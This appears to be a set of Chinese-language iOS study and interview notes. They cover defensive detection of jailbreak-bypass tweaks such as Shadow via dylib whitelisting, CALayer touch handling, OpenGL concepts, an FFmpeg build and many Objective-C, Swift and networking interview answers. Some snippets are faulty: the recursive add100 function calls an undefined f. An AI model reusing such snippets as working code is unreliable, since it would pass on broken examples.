### 如何防止shadow等插件绕过
```
检测这些插件的关键指纹，比如检测只有他们有的类, 查看是否有异常类和异常的动态库的实现

阻止DYLD_INSERT_LIBRARIES生效, 阻止DYLD_INSERT_LIBRARIES生效 。（这个可以通过修改macho，重新打包来绕过）

使用objc_copyImageNames方法记录使用的所有动态库，做成白名单，在运行过程中，再运行objc_copyImageNames去查看当前的动态库是否一致
```

### CALayer响应点击事件
1. 是利用containsPoint
2. 是利用hitTest
```
import UIKit

class ViewController: UIViewController {

    let layerOne = CALayer()
    let layerTwo = CALayer()

    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = UIColor.yellowColor()

        layerOne.frame = CGRectMake(100, 100, 50, 50)
        layerOne.backgroundColor = UIColor.redColor().CGColor
        view.layer.addSublayer(layerOne)

        layerTwo.frame = CGRectMake(100, 200, 50, 50)
        layerTwo.backgroundColor = UIColor.blueColor().CGColor
        view.layer.addSublayer(layerTwo)

    }

    override func touchesBegan(touches: Set<UITouch>, withEvent event: UIEvent?) {

        //方法一:运用containsPoint
        var p = (touches as NSSet).anyObject()?.locationInView(view)
        p = view.layer.convertPoint(p!, fromLayer: view.layer)

        if view.layer.containsPoint(p!) {

            let b = layerOne.convertPoint(p!, fromLayer: view.layer)
            if layerOne.containsPoint(b) {
                let alert = UIAlertView.init(title: "提示", message: "点击了红色按钮", delegate: nil, cancelButtonTitle: "取消")
                alert.show()
            }

           let a = layerTwo.convertPoint(p!, fromLayer: view.layer)
            if layerTwo.containsPoint(a) {
                let alert = UIAlertView.init(title: "提示", message: "点击了蓝色按钮", delegate: nil, cancelButtonTitle: "取消")
                alert.show()
            }
        }

//        //方法二：运用hitTest
//        let p = (touches as NSSet).anyObject()?.locationInView(view)
//        
//        let clickLayer = layerOne.hitTest(p!)
//        
//        if clickLayer == layerOne {
//            let alert = UIAlertView.init(title: "提示", message: "点击了红色按钮", delegate: nil, cancelButtonTitle: "取消")
//            alert.show()
//        }
//        
//        let anotherLayer = layerTwo.hitTest(p!)
//        
//        if anotherLayer == layerTwo {
//            let alert = UIAlertView.init(title: "提示", message: "点击了蓝色按钮", delegate: nil, cancelButtonTitle: "取消")
//            alert.show()
//        }

    }

}
```
## OpenGL

1、OpenGL
OpenGL (Open Graphics library) 是⼀一个跨编程语⾔、跨平台的编程图形程序接⼝，它将计算机的资源抽象称为一个个OpenGL的对象，对这些资源的操作抽象为一个个的OpenGL指令。


2、OpenGL ES
OpenGL ES (OpenGL for Embedded Systems) 是 OpenGL 三维图形 API 的子集，针对⼿机、 PDA和游戏主机等嵌入式设备而设计，去除了许多不必要和性能较低的API接口。


3、DirectX
DirectX 是由很多API组成的，DirectX并不是一个单纯的图形API. 最重要的是DirectX是属于 Windows上一个多媒体处理API.并不支持Windows以外的平台,所以不是跨平台框架. 按照性 质分类，可以分为四大部分，显示部分、声音部分、输⼊部分和网络部分。


4、Metal
Metal 是Apple为游戏开发者推出了新的平台技术 Metal，该技术能够为 3D 图 像提高 10 倍的渲染性能。Metal 是Apple为了解决3D渲染⽽而推出的框架。

其实苹果自14年推出Metal之后，就已经很明确的告诉大家，在极限性能方面，Metal的表现是要更加的出色的。因为他们对Metal做了很多针对性的优化，让他在iOS的设备上能有一个更完美的发挥。
这里也可以看出，Metal是可以取代OpenGL ES的。但是现在市场上面，依然还是OpenGL ES的使用率更高。所以OpenGL ES和Metal的关系就有点像是Objective-C和Swift的关系一样。

二、OpenGL专业名词解析

1、OpenGL上下文（Context）

在应用程序调用任何OpenGL指令之前，需要安排首先创建一个OpenGL的上下文。这个上下文是一个非常庞大的状态机，保存了OpenGL中的各种状态，这也是OpenGL指令执行的基础。

其实这里的上下文，我们可以类比一下JSContext，我在之前的一篇讲JSCore的博客里面讲到过这个东西。我们在操作任何的对象的时候，都需要通过上下文去拿到对象，同时上下文里面也记录了很多的我们需要使用的信息。

OpenGL的函数不管在哪个语言中，都是类似C语言一样的面向过程的函数，本质上面都是对OpenGL上下文这个庞大的状态机中的某个状态或者对象进行操作。当然你得首先把这个对象设置为当前对象。因此，通过对OpenGL指令的封装，是可以将OpenGL的相关调用封装成为一个面向对象的图形API的。

由于OpenGL上下文是一个巨大的状态机，切换上下文往往会产生较大的开销。但是不同的绘制模块，可能需要使用完全独立的状态管理。因此，可以在应用程序中分别创建多个不同的上下文，在不同的线程中使用不同的上下文，上下文之间共享纹理、缓冲区等资源。这样的方案，会比反复切换上下文，或者大量修改渲染状态，更加合理高效的。

2、OpenGL状态机

状态机理论上是一种机器，其实我们可以这样去理解，状态机描述了一个对象在其生命周期中所经历的各种状态，状态之间的转变，发生转变的动因，条件以及转变中所执行的活动。这一点上来说，跟JSContext也可以类比一下。我们的任何行为都是依赖着状态机的，状态机会记录所有的行为，那么我们在需要使用某一个行为的时候，也是可以通过状态机去拿出来某一个行为。所以状态机也是一种行为，说明对象在其生命周期中相应事件所经历的状态序列以及对那些状态事件的相应。


因此具有以下特点：


有记忆功能，能记住其当前的状态

可以接受输入，根据输入的内容和自己的原先状态，修改自己当前状态，并且可以有对应输出

当进入特殊状态（停机状态）的时候，便不再接收输入，停止工作。

3、渲染（Rendering）

这个好理解，就是将图形/图像数据转换成3D空间图像操作叫做渲染。例如，在图片或者视频进行解码之后，形成了一大堆的二进制文件，然后我们将这一堆的二进制文件显示到屏幕上面的过程就可以理解为渲染。


4、顶点数组（VertexArray）

那么什么是顶点呢？顶点就是指我们再绘制一个图形的时候，他的顶点的位置数据，这个数据是可以直接存储在数组中或者将其缓存在GPU内存中的。如果存储在数组中就构成了顶点数组。其实顶点数据就是我们在画画的时候，最开始画的一个大致的骨架。在OpenGL中的图像都是由图元组成。在OpenGL ES中，有三种图元：点、线、三角形。我们通过设定函数的指针，将顶点数据存储在内存中，然后需要绘制的时候，直接从内存中取出来使用。这一部分的数据其实就是顶点数组。


5、顶点缓冲区（VertexBuffer）

我们上面说了，我们在调用绘制方法的时候，直接就由内存传入顶点数据。还有一种更加高性能的方法，就是提前分配一快内存，将顶点数据预先传入到显存当中，这部分的显存，就叫做顶点缓冲区。值得注意的是，这一块空间不再内存中，而是在显存的一块空间中。


6、管线

因为我们的GPU在处理数据的时候，是通过一个固定的顺序来的，这个顺序不能被打破。类似一个流水线的形式，所以被称之为管线。


7、固定管线/存储着色器

在早期的OpenGL版本，它封装了很多着色器程序块内置的一段包含了光照、坐标变换、裁剪等等诸多功能的固定shader程序来完成，来帮助开发者来完成图形的渲染。而开发者只需要传入相应的参数，就能快速完成图形的渲染，类似于iOS开发会封装很多的API。而我们只需要调用，就可以实现功能，不需要关注底层实现原理

但是犹豫OpenGL的使用场景非常丰富，固定管线或存储着色器无法完成每一个业务，这是将相关部分开放成可编程。

8、着色器程序Shader

就全面的将固定渲染管线架构变为了可编程渲染管线。因此，OpenGL在实际调⽤绘制函数之前，还需要指定一个由shader编译成的着色器程序。常见的着色器主要有顶点着⾊器(VertexShader)，⽚段着⾊器 (FragmentShader)/像素着⾊器(PixelShader)/片元着色器，⼏何着⾊器 (GeometryShader)，曲⾯细分着⾊器(TessellationShader)。⽚段着⾊器和像素着⾊器只是在OpenGL和DX中的不同叫法⽽而已。可惜的是，直到 OpenGLES 3.0，依然只支持了顶点着⾊器和片段着⾊器这两个最基础的着⾊器。

OpenGL在处理shader时，和其他编译器一样。通过编译、链接等步骤，⽣成了着⾊器程序(glProgram)，着⾊器程序同时包含了顶点着⾊器和⽚段着⾊器的运算逻辑。在OpenGL进行绘制的时候，⾸先由顶点着⾊器对传⼊的顶点数据进行运算。再通过图元装配，将顶点转换为图元。然后进行光栅化，将图元这种矢量图形，转换为栅格化数据。最后，将栅格化数据传入⽚段着⾊器中进行运算。⽚段着⾊器会对栅格化数据中的每一个像素进行运算，并决定像素的颜⾊。

9、顶点着色器VertexShader

一般用来处理图形每个顶点变换[旋转/平移/投影等]

顶点着色器是OpenGL中用于计算顶点属性的程序。顶点着色器是逐个顶点运算的程序，也就是说每个顶点数据都会执行一次顶点着色器，当然这是并行的，并且顶点着色器运算过程中无法访问其他顶点的数据

一般来说典型的需要计算的顶点属性包括顶点坐标变换、逐个顶点光照运算等等。顶点坐标由自身坐标系转换到归一化做标记的运算，就是在这里发生的。

10、片元着色器 FragmentShader

一般用来处理图形中每个像素点颜色计算和填充

片段着色器是OpenGL中用于计算片段（像素）颜色的程序。片段着色器是逐个像素运算的程序，也就是说每个像素都会执行一次片段着色器，当然也是并行的。

11、GLSL（OpenGL Shading language)

OpenGL着色语言（OpenGL Shading language)是用来在OpenGl中着色编程的语言，类似于C语言。他们是在图形卡的GPU（Graphic Proccessor Unit图形处理单元）上执行的。代替了固定的渲染管线的一部分，使渲染管线中不同层次具有可编程性。比如：视图转换、投影转换等。GLSL的着色器代码分成两个部分：顶点着色器和片段着色器

12、光栅化Rasterization

是把顶点数据转换成片元的过程，具有将图转化成为一个个栅格组成的图像的作用。特点是每个元素对应帧缓冲区中的一个像素。

光栅化就是把顶点数据转换为片元的过程。片元中的每一个元素对应于帧缓冲区中的一个像素

光栅化其实是一种将几何图元变为二维图像的过程。该过程包含了两部分的工作。第一部分工作：决定了窗口坐标中哪些整型格栅区域被基本图元占用。第二部分工作：分配一个颜色值和一个深度值到各个区域。光栅化过程产生的是片元。

把物体的数学描述以及与物体相关的颜色信息转换为屏幕上用于对应位置的像素及⽤于填充像素的颜色，这个过程称为光栅化，这是一个将模拟信号转化为离散信号的过程

13、纹理

纹理可以理解为一个图片，也就是位图。⼤家在渲染图形时需要在其编码填充图⽚,为了使得场景更加逼真.⽽这里使⽤的图片,就是常说的纹理.但是在OpenGL,我们更加习惯叫纹理,⽽不是图片。


14、混合（Blending）

在测试阶段之后，如果像素依然没有被剔除，那么像素的颜色将会和帧缓冲区中颜色附着上的颜色进行混合，混合的算法可以通过OpenGL的函数进行指定。但是OpenGL提供的混合算法是有限的，如果需要更加复杂的混合 算法，⼀般可以通过像素着⾊器进行实现，当然性能会比原生的混合算法差一些。


15、变换矩阵(Transformation)

例如图形想发生平移,缩放,旋转变换。就需要使用变换矩阵。


16、投影矩阵（Projection）

⽤于将3D坐标转换为二维屏幕坐标,实际线条也将在二维坐标下进行绘制。


17、渲染上屏/交换缓冲区(SwapBuffer)

当我们想把一个图像渲染到窗口的时候，GPU会开辟一个渲染缓冲区。但是每一个窗口又只有一个缓冲区，那么如果在绘制的过程中屏幕进行了刷新，窗口显示的画面就有可能不完整。为了解决这个问题，常规的OpenGL程序至少都会有两个缓冲区。显示在屏幕上的称为屏幕缓冲区，没有显示的称为离屏缓冲区，在一个缓冲区渲染完成之后，通过将屏幕缓冲区和离屏缓冲区交换，实现图像在屏幕上的显示。在iOS中经常遇到的离屏渲染，其实就是双缓冲区的机制引起的。如果这方面有疑问的，可以移步iOS 保持界面流畅的技巧去了解。
使用了双缓冲区和垂直同步技术之后，由于总是要等待缓冲区交换之后再进行下一帧的渲染，使得帧率无法完全达到硬件允许的最高水平。为了解决这个问题，引入了三缓冲区技术，在等待垂直同步时，来回交替渲染两个离屏的缓冲区，而垂直同步发生时，屏幕缓冲区和最近渲染完成的离屏缓冲区交换，实现充分利用硬件性能的目的。

## FFmpeg
FFmpeg是一套可以用来记录、转换数字音频、视频，并能将其转化为流的开源计算机程序。
采用LGPL或GPL许可证。它提供了录制、转换以及流化音视频的完整解决方案，包括了领先的音、视频编码库libavcodec等。
```
libavformat：用于各种音视频封装格式的生成和解析；
libavcodec： 用于各种类型声音、图像编解码；
libavutil：  包含一些公共的工具函数；
libswscale： 用于视频场景比例缩放、色彩映射转换；
libpostproc：用于后期效果处理；
ffmpeg：     该项目提供的一个工具，可用于格式转换、解码或电视卡即时编码等；
ffsever：    一个 HTTP 多媒体即时广播串流服务器；
ffplay：     是一个简单的播放器，使用ffmpeg 库解析和解码，通过SDL显示；
```

1. 下载 https://github.com/kewlbear/FFmpeg-iOS-build-script
2. cd 路径 打开终端 $  sh build-ffmpeg.sh
步骤2执行完成后运行sh build-ffmpeg.sh lipo将.a文件合并成一个；
步骤3执行完成将FFmpeg-iOS文件夹拖到目标工程并添加libz.dylib、libbz2.dylib、libiconv.dylib三个库，xcode7 及以上则是添加libz.tbd、libbz2.tbd、libiconv.tbd，
并添加框架VideoToolbox.framework（此框架是 iOS8 新增的，用于硬解码）

设置头文件路径$(PROJECT_DIR)/$(PRODUCT_NAME)/FFmpeg-iOS/include：
OC 工程在调用的时候直接#include "avformat.h"；
swift 工程创建桥接头文件，在头文件内添加#import "avformat.h"

objc
0. 静态变量和全局变量区别
作用域的区别

1. 日常使用的修饰属性的关键字都有哪些？作用分别是什么？
2. 属性的实质是什么？
3. 深拷贝和浅拷贝，`NSString` 为什么要用 `copy` 修饰，换成 `strong` 会有什么问题？`NSMutableString` 可以用 `copy` 修饰吗？会有什么问题吗？
使用 NSMutableString 肯定是想用字符串的可变这个属性，但如果你用 copy 去修饰，那么生成的将会是不可变的，当你去调用可变方法时，程序将会崩溃！

4. 说一下 `static` 关键字
5. 什么情况下会引发循环引用？怎么解决？
6. `include` 和 `import` 作用是什么？它们有什么区别？

7. 介绍一下 `KVC` 和 `KVO` 及其实现原理
KVO - Key-Value-Observing 键值观察是基于KVC实现的一种观察者机制，提供了观察对象的某一个属性变化的监听方法。
KVO利用runtime的机制，当对一个对象进行观察时，会在运行时创建一个该对象的子类，这个子类一般以NSKVONotifying_xxx（xxx为父类的名字）命名，子类中会重写所有被观察属性的set方法，除了创建子类，还会将该对象的isa指针指向这个子类，当被观察的对象属性修改时，通过isa找到子类，在通过子类的方法列表找到对应的set方法，set方法是被重写过得，里面实现了相关的通知。

8. 介绍一下 OC 的消息传递机制
9. 介绍一下 OC 的消息转发机制
10. OC 支持多继承吗？如何实现 OC 的多继承？
11. OC 支持方法重载吗？
12. `CALayer` 有哪三种树？
layer tree  分为 model layer tree(模型图层树) 、presentation layer tree（表示图层树） 、render layer tree（渲染图层树）
模型图层树 中的对象是应用程序与之交互的对象。此树中的对象是存储任何动画的目标值的模型对象。每当更改图层的属性时，都使用其中一个对象。
modelLayer

表示图层树 中的对象包含任何正在运行的动画的飞行中值。层树对象包含动画的目标值，而表示树中的对象反映屏幕上显示的当前值。您永远不应该修改此树中的对象。相反，您可以使用这些对象来读取当前动画值，也许是为了从这些值开始创建新动画。
presentationLayer

渲染图层树 中的对象执行实际动画，并且是Core Animation的私有动画。使用不上

 self.layer = self.layer.modelLayer 、self.layer != self.layer.presentationLayer。 
 ### layer本身就是一个modelLayer，只不过它拥有presentationLayer。
 
 Core Animation动画执行的时间取决于当前事务的设置，动画类型取决于图层行为。


13. 什么是隐式动画？如何关闭隐式动画？ CATransaction
任何Layer的animatable属性的设置都应该属于某个CA事务(CATransaction),事务的作用是为了保证多个animatable属性的变化同时进行,不管是同一个layer还是不同的layer之间的.CATransaction也分两类,显式的和隐式的,当在某次RunLoop中设置一个animatable属性的时候,如果发现当前没有事务,则会自动创建一个CA事务,在线程的下个RunLoop开始时自动commit这个事务,如果在没有RunLoop的地方设置layer的animatable属性,则必须使用显式的事务.

事务：包含一系列属性动画集合的机制，用指定事务去改变可以做动画的图层属性不会立刻发生变化，而是当事务一旦提交的时候开始用一个动画过渡到新值.
事务 通过CATransaction类来做管理，CATransaction可以用加号方法+begin和+commit分别来入栈或者出栈。并且遵循先进后出
任何可以做动画的图层属性都会被添加到栈顶的事务，你可以通过+setAnimationDuration:方法设置当前事务的动画时间，或者通过+animationDuration方法来获取值（默认0.25秒）。

显式事务的使用如下：
[CATransaction begin];

...  

[CATransaction commit];

事务可以嵌套.当事务嵌套时候,只有当最外层的事务commit了之后,整个动画才开始.

可以通过CATransaction来设置一个事务级别的动画属性,覆盖隐式动画的相关属性,比如覆盖隐式动画的duration,timingFunction.如果是显式动画没有设置duration或者timingFunction,那么CA事务设置的这些参数也会对这个显式动画起作用.
//关闭隐式动画
CATransaction 在 Core Animation framework中主要扮演了“整体舞台设定的角色”。

使用 CATransaction 的方式就是把我们想做的特别的设定的动画代码，用 CATransaction 的class method前后包起来。

比方说，我们现在不希望产生动画，便可以这样写：
[CATransaction begin];
[CATransaction setDisableActions:YES];
//原本动画的代码
[CATransaction commit];

如果我们想要改变动画时间：

[CATransaction begin];
[CATransaction setAnimationDuration:1.0];
    
14. 介绍一下 `block` 及其实现原理
15. 如何在`block` 内部修改外部变量？
16. `block` 种类有哪些？ `block`  为什么要用 `copy` 修饰？
17. `autoReleasePool` 的原理是什么？
18. `ARC` 和 `MRC` 的区别是什么？
19. 介绍一下引用计数。一个对象什么时候其引用计数才会变为 0?
20. 主线程和子线程的区别？为什么刷新 UI 要放到主线程？
21. 介绍一下多线程。实现多线程有哪几种方式？
22. 介绍一下 `runtime` 机制。`runtime` 在日常开发中都有哪些用途？
23. 介绍一下 `runloop`。日常开发中怎么使用的？
24. `cell` 的复用机制及原理，如何自己设计一个 `cell` 复用池？
25. `UITableView` 如何优化？优化的 9 个建议
26. 如何扩大一个按钮的点击区域？
27. `OC` 的 `category` 和 `extension` 的区别
28. 如何设计一下网络库？
29. 介绍一下 `MVC` 、`MVVM` 和 MVP， 以及它们之间的区别
30. 介绍一下 OC 中的类簇
31. `CoreAnimation` 在渲染过程中做了什么？
32. 说一下线程和 `runloop` 的关系
33. 日常开发中用到过哪些三方库？有看过三方库的源码吗？一些知名的三方库实现原理。
34. 手写一个单例
35. `Hybrid` 与原生交互原理（过程）
36. 卡顿监控方案
37. 如何解决在使用 `NSTimer` 或 `CADisplayLink` 过程中的内存泄漏问题？
38. 做过组件化吗？组件化的方案有哪几种？
39. 原子锁和非原子锁 （atomic 和 nonatomic）
40. 日常中用到的锁有哪些？
41. iOS 中内省的几个方法？class方法和objc_getClass方法有什么区别?
42. [self class] 与 [super class] 分别打印出来什么？如何获取当前类的父类？
43. self.name = object 与 _name = object 之间有何区别？在对象的 init 方法中赋值时应该使用上述二者中的哪一种及原因？
44. 如何判断两个对象是否相等？
45. weak 的实现原理
46. load 和 initialize 方法的区别及它们之间的加载顺序
47. 介绍一下 `OC` 的响应链
48. `category` 加载时机及加载顺序
49. `WKWebbiew` 白屏问题
50. 数据持久化的方案都有哪些（数据库是重点）
51. KVO，Notification, delegate 的优缺点，效率及使用场景
52. 如何监控一个页面持有的对象是否有内存泄漏问题？
53. 有看过 `OC` 底层源码？介绍一下你熟悉的

swift
0. `swift` 相比 `OC` 有什么优点？
1. `swift` 的语言有哪些特点？
2. 介绍一下函数式编程
3. `swift` 为什么不支持静态库？
4. `swift` 的 `extension` 和 `category` 的区别？ 以及它们与 `OC` 的区别？
5. `swift` 有哪些新的语言特性？
6. 介绍一下 `swift` 的泛型

计算机
0. 说一下`三次握手`和`四次挥手`
1. 说一下 `TCP` 和 `UDP` 的区别？
2. 说一下 `HTTP` 和 `HTTPs` 的区别？
3. `SSL/TSL` 的过程是怎样的？
4. 网络都分为哪几层？作用分别是什么？
5. 常见的 `HTTP` 状态值及释义
6. 什么是 `socket` 编程？什么是 `websocket`?什么是心跳？
7. 说一下 `HTTP` 的请求报文和响应报文的格式
8. 简述 https 协议是如何保证客户端与服务器之间进行安全通信的？为了保证通信不被窃听，客户端应该朋采取什么措施？
9. `GET` 与 `POST` 方法区别？
10. `HTTP` 常用的请求头都有哪些？

0. `iOS` 在 `pre-main` 阶段都做了些什么
1. 编译的过程是怎样的？
2. `clang` 接触过吗？介绍一下 `clang`
3. `OC` 的 `pre-main` 阶段都做了哪些事情？
4. 链接的过程都做了哪些事情？
5. `OC` 的内存区块都有哪些？

0. 算法时间复杂度是指什么？
1. `B` 树，`B+` 树，`B*` 树的区别是什么？什么是红黑树？
2. `C` 语言中都有哪些数据结构？
3. hash 表是怎样实现的？
4. 使用递归判断回文。如 level 就是一个回文
5. 反转链表
6. 判断镜像二叉树
7. 求一个二叉树的度
8. 快速排序，冒泡排序，插入排序
9. `LRU` 算法
10. 两个栈实现一个队列

0. `23` 种设计模式熟悉一下
1. 设计模式有哪 `6` 大设计原则？
2. 简单工厂模式，工厂模式，抽象工厂模式
3. 中介者模式
4. 外观模式
5. 观察者模式

1、说一下OC的反射机制；
系统Foundation框架为我们提供了一些方法反射的API，我们可以通过这些API执行将字符串转为SEL等操作。由于OC语言的动态性，这些操作都是发生在运行时的。
```
// SEL和字符串转换
FOUNDATION_EXPORT NSString *NSStringFromSelector(SEL aSelector);
FOUNDATION_EXPORT SEL NSSelectorFromString(NSString *aSelectorName);
// Class和字符串转换
FOUNDATION_EXPORT NSString *NSStringFromClass(Class aClass);
FOUNDATION_EXPORT Class __nullable NSClassFromString(NSString *aClassName);
// Protocol和字符串转换
FOUNDATION_EXPORT NSString *NSStringFromProtocol(Protocol *proto) NS_AVAILABLE(10_5, 2_0);
FOUNDATION_EXPORT Protocol * __nullable NSProtocolFromString(NSString *namestr) NS_AVAILABLE(10_5, 2_0);
```
2、block的实质是什么？有几种block？分别是怎样产生的？
实质也是OC对象 因为具有isa指针
根据isa指针，block一共有3种类型的block
_NSConcreteGlobalBlock 
全局静态_NSConcreteStackBlock 保存在栈中，出函数作用域就销毁
_NSConcreteMallocBlock 保存在堆中，retainCount == 0销毁


3、__block修饰的变量为什么能在block里面能改变其值？
加了__block, 并不是直接传递对象的值了，而是把对象的地址传过去了，所以在block内部便可以修改到外面的变量了。

4、说一下线程之间的通信。(多线程几种方式)
- (void)performSelectorOnMainThread:(SEL)aSelector withObject:(id)arg waitUntilDone:(BOOL)wait;
- (void)performSelector:(SEL)aSelector onThread:(NSThread *)thr withObject:(id)arg waitUntilDone:(BOOL)wait;
GCD/NSThread/NSOperation

5、应用的崩溃？
存在CPU无法运行的代码
不存在或者无法执行
操作系统执行某项策略，终止程序
启动时间过长或者消耗过多内存时，操作系统会终止程序运行
编程语言为了避免错误终止程序：抛出异常
开发者为了避免失败终止程序：Assert

符号化
app.xcarchive文件，包内容包含dSYM和应用的二进制文件。
更精确的符号化，可以结合崩溃日志、项目二进制文件、dSYM文件，对其进行反汇编，从而获得更详细的信息

6、说一下hash算法
MD5加密
哈希（Hash）算法，即散列函数。它是一种单向密码体制，即它是一个从明文到密文的不可逆的映射，只有加密过程，没有解密过程。同时，哈希函数可以将任意长度的输入经过变化以后得到固定长度的输出。哈希函数的这种单向特征和输出数据长度固定的特征使得它可以生成消息或者数据。

7、NSDictionary的实现原理是什么？
在OC中NSDictionary是使用hash表来实现key和value的映射和存储的。
哈希表（hash表）： 又叫做散列表，是根据关键码值（key value）而直接访问的 数据结构 。也就是说它通过关键码值映射到表中一个位置来访问记录，以加快查找的速度。这个映射叫做 函数 ，存放记录的 数组 叫做 哈希表 。
OC中的字典其实是一个数组，数组中每一个元素同样为一个链表实现的数组，也就是数组中套数组。

那么对应在oc中字典是如何进行存储的呢？

在oc中每一个对象创建时，都默认生成一个hashCode,也就是经过hash算法生成的一串数字，当利用key去取字典中的value时，若是使用遍历或者二分查找等方法，效率相对较低，于是出现了根据每一个key生成的hashCode将键值对放到hasCode对应的数组中的指定位置，这样当用key去取值时，便不必遍历去获取，既可以根据hashCode直接取出。因为hashCode的值过大，或许经过取余获取一个较小的数字，假如是对999进行取余运算，那么得到的结果始终处于0-999之间。但是，这样做的弊端在于取余所得到的值，可能是相同的，这样可能导致完全不相干的键值对被新的键值对（取余后值key相等）所覆盖，于是出现了数组中套链表实现的数组。这样，key值取余得到值相等的键值对，都将保存在同一个链表数组中，当查找key对应的值时，首先获取到该链表数组，然后遍历数组，取正确的key所对应的值即可。

8、你们的App是如何处理本地数据安全的（比如用户名的密码）？
Keychain是iOS所提供的一种安全存储参数的方式，最常用来存储账号，密码，用户信息，银行卡资料等信息，Keychain会以加密的方式存储在设备中

9、遇到过BAD_ACCESS的错误吗？你是怎样调试的？
向一个已经释放的对象发送消息 野指针

僵尸对象在许多情况下解决这个问题。通过保留已释放的对象，Xcode可以告诉你你试图访问哪个对象，这使的查找问题原因容易得多
选中Edit Scheme。在左侧选中Run ，在上方打开 Diagnostics选项。要启用僵尸对象，勾选 Zombie Objects选框。

10、什么是指针常量和常量指针？
“常量指针是指--指向常量的指针,顾名思义,就是指针指向的是常量,即,它不能指向变量,它指向的内容不能被改变,不能通过指针来修改它指向的内容,但是指针自身不是常量,它自身的值可以改变,从而可以指向另一个常量。 
指针常量是指--指针本身是常量

11、不借用第三个变量，如何交换两个变量的值？要求手动写出交换过程。
a = a + b;
b = a - b; // b = (a +b)-b,即 b = a
a = a - b; // a = (a+b)-a


12、若你去设计一个通知中心，你会怎样设计？

13、如何去设计一个方案去应对后端频繁更改的字段接口？



14、KVO、KVC的实现原理
一个对象的属性被观察时系统动态创建了一个子类，并且改变了原有对象的isa指针指向，指向动态创建的子类，子类中重写了被观察属性的set方法，在使用点方法和set方法给属性赋值时，最终调用的是子类中的set方法。

15、用递归算法求1到n的和
int add100(int n) {
    //定义函数f 出口为n等于1，否则将n与f(n-1)相加
    if(n == 1) {//出口
        return(1);
    }else{//递归公式
        return(f(n-1) + n);
    }
}



16、category为什么不能添加属性？
在分类里使用@property声明属性，只是将该属性添加到该类的属性列表，但是没有生成相应的成员变量，也没有实现setter和getter方法。


17、说一下runloop和线程的关系。
线程和 RunLoop 之间是一一对应的，其关系是保存在一个全局的 Dictionary 里。
线程刚创建时并没有 RunLoop，如果你不主动获取，那它一直都不会有。
RunLoop 的创建是发生在第一次获取时，RunLoop 的销毁是发生在线程结束时。
你只能在一个线程的内部获取其 RunLoop（主线程除外）。



18、说一下autoreleasePool的实现原理。
一个线程的autoreleasepool就是一个指针栈。
栈中存放的指针指向加入需要release的对象或者POOL_SENTINEL（哨兵对象，用于分隔autoreleasepool）。
栈中指向POOL_SENTINEL的指针就是autoreleasepool的一个标记。
当autoreleasepool进行出栈操作，每一个比这个哨兵对象后进栈的对象都会release。
这个栈是由一个以page为节点双向链表组成，page根据需求进行增减。
autoreleasepool对应的线程存储了指向最新page（也就是最新添加autorelease对象的page）的指针。



19、说一下简单工厂模式，工厂模式以及抽象工厂模式？
20、如何设计一个网络请求库？
21、说一下多线程，你平常是怎么用的？


22、说一下UITableViewCell的卡顿你是怎么优化的？
1.提前计算并缓存好高度，因为heightForRow最频繁的调用。

2.异步绘制，遇到复杂界面，性能瓶颈时，可能是突破口。

3.滑动时按需加载，这个在大量图片展示，网络加载时，很管用。（SDWebImage已经实现异步加载）。

4.重用cells。

5.如果cell内显示得内容来自web，使用异步加载，缓存结果请求。

6.少用或不用透明图层，使用不透明视图。

7.尽量使所有的view opaque，包括cell本身。

8.减少subViews

9.少用addView给cell动态添加view，可以初始化的时候就添加，然后通过hide控制是否显示。


23、看过哪些三方库？说一下实现原理以及好在哪里？
24、说一下HTTP协议以及经常使用的code码的含义。
404 403 500 502


25、设计一套缓存策略。
26、设计一个检测主线和卡顿的方案。


27、说一下runtime，工作是如何使用的？看过runtime源码吗？
struct isa指针 

28、说几个你在工作中使用到的线程安全的例子
@property (atomic, strong)
@synchronized(token)
NSLock
dispatch_semaphore_t

29、用过哪些锁？哪些锁的性能比较高？
多线程编程时，没有锁的情况 == 线程不安全。
递归锁/@synchronized/os_unfair_lock:(互斥锁)/条件锁NSCondition/dispatch_semaphore

30、说一下HTTP和HTTPs的请求过程？

31、说一下TCP和UDP
UDP 与 TCP 的主要区别在于 UDP 不一定提供可靠的数据传输。

1、TCP面向连接（如打电话要先拨号建立连接）;UDP是无连接的，即发送数据之前不需要建立连接

2、TCP提供可靠的服务。也就是说，通过TCP连接传送的数据，无差错，不丢失，不重复，且按序到达;UDP尽最大努力交付，即不保证可靠交付

3、TCP面向字节流，实际上是TCP把数据看成一连串无结构的字节流;UDP是面向报文的UDP没有拥塞控制，因此网络出现拥塞不会使源主机的发送速率降低（对实时应用很有用，如IP电话，实时视频会议等）

4、每一条TCP连接只能是点到点的;UDP支持一对一，一对多，多对一和多对多的交互通信

5、TCP首部开销20字节;UDP的首部开销小，只有8个字节6、TCP的逻辑通信信道是全双工的可靠信道，UDP则是不可靠信道



32、说一下静态库和动态库之间的区别
 静态库: 静态库是在编译时,完整的拷贝至可执行文件中,被多次使用就有多次冗余拷贝;
 动态库: 程序运行时由系统动态加载到内存,而不是复制,供程序调用。系统只加载一次,多个程序共用,节省内存
 静态库：以.a 和 .framework为文件后缀名。

动态库：以.tbd(之前叫.dylib) 和 .framework 为文件后缀名。（系统直接提供给我们的framework都是动态库！）

理解：.a 是一个纯二进制文件，.framework 中除了有二进制文件之外还有资源文件。 .a ，要有 .h 文件以及资源文件配合， .framework 文件可以直接使用。总的来说，.a + .h + sourceFile = .framework。所以创建静态库最好还是用.framework的形式


 
33、load和initialize方法分别在什么时候调用的？
load和initialize方法都会在实例化对象之前调用，以main函数为分水岭，load在main函数之前调用，后者在之后调用。这两个方法会被自动调用，不能手动调用它们。

load和initialize方法都不用显示的调用父类的方法而是自动调用，即使子类没有initialize方法也会调用父类的方法，而load方法则不会调用父类。

load方法通常用来进行Method Swizzle，initialize方法一般用于初始化全局变量或静态变量。

load和initialize方法内部使用了锁，因此它们是线程安全的。实现时要尽可能保持简单，避免阻塞线程，不要再使用锁。


34、NSNotificationCenter是在哪个线程发送的通知？
NSNotificationCenter通知中心是同步操作
接收通知和发送通知时所在线程一致，和监听时所在线程无关。

35、用过swift吗？如果没有，平常有学习吗？
class struct

36、说一下你对架构的理解？
MVVM

37、为什么一定要在主线程里面更新UI？
  a. UIKit并不是一个 线程安全 的类，UI操作涉及到渲染访问各种View对象的属性，如果异步操作下会存在读写问题，而为其加锁则会耗费大量资源并拖慢运行速度。
  b. 整个程序的起点UIApplication是在主线程进行初始化，所有的用户事件都是在主线程上进行传递（如点击、拖动），所以view只能在主线程上才能对事件进行响应。
